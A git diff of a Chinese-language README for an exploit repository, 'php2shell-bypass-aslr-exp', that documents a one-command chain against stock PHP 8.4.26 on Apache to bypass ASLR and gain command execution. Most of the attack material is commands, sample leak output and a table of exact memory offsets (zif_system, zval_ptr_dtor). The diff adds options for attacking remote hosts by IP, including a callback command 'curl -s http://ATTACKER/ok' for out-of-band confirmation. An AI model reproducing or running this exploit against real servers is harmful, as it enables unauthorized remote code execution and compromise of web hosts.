@@ -24,7 +24,6 @@ cd php2shell-bypass-aslr-exp
 # 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
 ./pure/run_pure.sh
 # target: OK
-# architecture: x86_64 (run exploit with --arch x86_64)
 # PHP 8.4.26 ...
 # display_errors => Off => Off
 # memory_limit => 128M => 128M
@@ -32,11 +31,10 @@ cd php2shell-bypass-aslr-exp
 
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
 python3 exploit.py --port 18110
-#       --arch auto（默认）：自动识别 x86_64 / aarch64
 #       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
-#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
+#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
 #       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
 #                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
 # [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
@@ -46,10 +44,8 @@ python3 exploit.py --port 18110
 
 不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
 `pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
-官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际架构、ini 和
-MPM 值；`--single` 才挂非官方的单 worker 覆盖
-`pure/docker/apache-single-worker.conf`（配合 `--workers 1`）。`docker/apache.conf`
-只是给旧 harness 保留的兼容软链，指向同一个文件。
+官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际 ini 和 MPM
+值；`--single` 才挂单 worker 的 `docker/apache.conf`（配合 `--workers 1`）。
 Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
 `DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
 同一构建做离线标定。
@@ -63,13 +59,24 @@ python3 exploit.py --port 18110 --restart p2s-pure-18110
 # 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
 python3 exploit.py --port 18110 --workers 1
 
-# ARM64 也可显式指定（默认 --arch auto 自动识别）
-python3 exploit.py --arch aarch64 --port 18110 --workers 1
-
 # 自定义命令：把脚本写进挂载目录，再用 sh 执行
 printf 'id; uname -a > /out/p1\n' > out/c
 python3 exploit.py --port 18110 --cmd 'sh</out/c'
+
+# 远程目标：--host（别名 --ip）指定 IP/域名，--cmd 指定要执行的命令
+python3 exploit.py --host 10.0.0.5 --port 80 --cmd 'id>/tmp/p1'
+
+# 拿不到本地 proof 文件时加 --no-verify：把三个 main-chunk 候选都打一遍，
+# 结果用带外方式（DNS/HTTP 回连或写 web 目录）确认
+python3 exploit.py --host 10.0.0.5 --port 80 \
+    --cmd 'curl -s http://ATTACKER/ok' --no-verify
+
+# 命令较长或含引号/换行时，直接从文件读取（覆盖 --cmd）
+python3 exploit.py --host 10.0.0.5 --port 80 --cmd-file out/c --no-verify
 ```
+
+`--cmd` 走的是 384 字节 fake zend_array 载体，命令最长 200 字节（0x160-0x98）；
+超长会在启动时直接报错。`--host` 默认 `127.0.0.1`，本地 lab 用法不变。
 
 `--retries` 默认 3；如果某次越界窗口里最常见的指针不是
 `zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
@@ -104,15 +111,13 @@ python3 exploit.py --port 18110 --cmd 'sh</out/c'
 
 偏移（本构建，ASLR 无关）：
 
-| 符号/位置 | x86_64 | aarch64 |
-|---|---|---|
-| 泄漏的 `zval_ptr_dtor` 指针 | `libphp+0x65EB60` | `libphp+0x63812B` |
-| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
-| fake array `S` | `main+0xF8398` | `main+0xF8398` |
-| A2 的 `hsv` | `main+0x7D720` | `main+0x7D720` |
+| 符号/位置 | 值 |
+|---|---|
+| `zval_ptr_dtor` | `libphp+0x65EB60` |
+| `zif_system` | `libphp+0x465370` |
+| fake array `S` | `main+0xF8398` |
+| A2 的 `hsv` | `main+0x7D720` |
 
-aarch64 的 `zval_ptr_dtor` ELF 符号位于 `0x638120`，但此泄漏中重复出现的
-指针在其后 11 字节，因此 profile 减去 `0x63812B`。
 目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
 mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
 ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
@@ -124,9 +129,21 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 - 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
 - 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
-- 原生 ARM64 官方镜像日志（10/10 个全新容器）：[pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
-- 原生 ARM64 官方 worker 日志（3/3 个全新容器）：[pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
 - proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
+
+## 目录结构
+
+| 路径 | 内容 |
+|---|---|
+| [exploit.py](exploit.py) | 一键利用入口（A1 → B1 泄漏 → A2 → B2） |
+| [pure/](pure/) | 纯 HTTP 链的请求生成器/发送器、标定脚本与证据 |
+| [docker/](docker/) | 单 worker 标定用的 Apache/PHP 配置 |
+| [lab/](lab/) | ASLR 实验用 Apache 配置 |
+| [tools/](tools/) | 开发期标定、调试与验证脚本（按需使用） |
+| [logs/](logs/) | 调试与复现日志 |
+| [archive/legacy-8m/](archive/legacy-8m/) | 旧的自定义 ini 线（8M / display_errors=On） |
+| [out/](out/) | 运行产物（proof），默认不提交 |
+| `src/` | 本地 PHP 源码/符号，仅标定用，不入库 |
 
 ## 旧线（legacy，非本目标）
 
@@ -135,12 +152,7 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 与本 README 的官方配置目标无关，已归档到
 [archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
 同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
-[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线；
-旧的 `docker/php.ini`、`docker/docker-compose.yml`、`docker/offsets.py` 和
-`lab/apache2_aslr.conf` 也归档到了 `archive/legacy-8m/docker|lab/`。
-真正的单 worker 配置和目标页面在 `pure/docker/`
-（`apache-single-worker.conf`、`www/index.php`）；`docker/` 只保留
-`apache.conf`、`www` 两个兼容软链指向那里。
+[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线。
 
 ## 复现声明
 
